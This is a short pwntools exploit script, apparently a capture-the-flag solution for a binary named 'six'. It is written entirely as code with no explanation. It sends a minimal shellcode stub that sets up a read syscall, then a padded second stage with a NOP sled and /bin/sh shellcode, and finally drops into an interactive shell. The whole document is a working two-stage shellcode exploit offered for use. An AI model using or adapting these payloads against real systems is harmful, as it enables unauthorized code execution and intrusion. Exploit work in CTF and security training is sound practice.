from pwn import *
context.log_level = 'debug'
cn = process('./six')

context.arch = 'amd64'
sc='''push rsp;pop rsi;lahf;xchg edx,eax;syscall'''
sc = asm(sc)
print sc
cn.sendafter(':',sc)

pay = 'a'*(0x1000-0x500)
pay+='\x90'*0x36+asm(shellcraft.sh())
cn.sendline(pay)

cn.interactive()
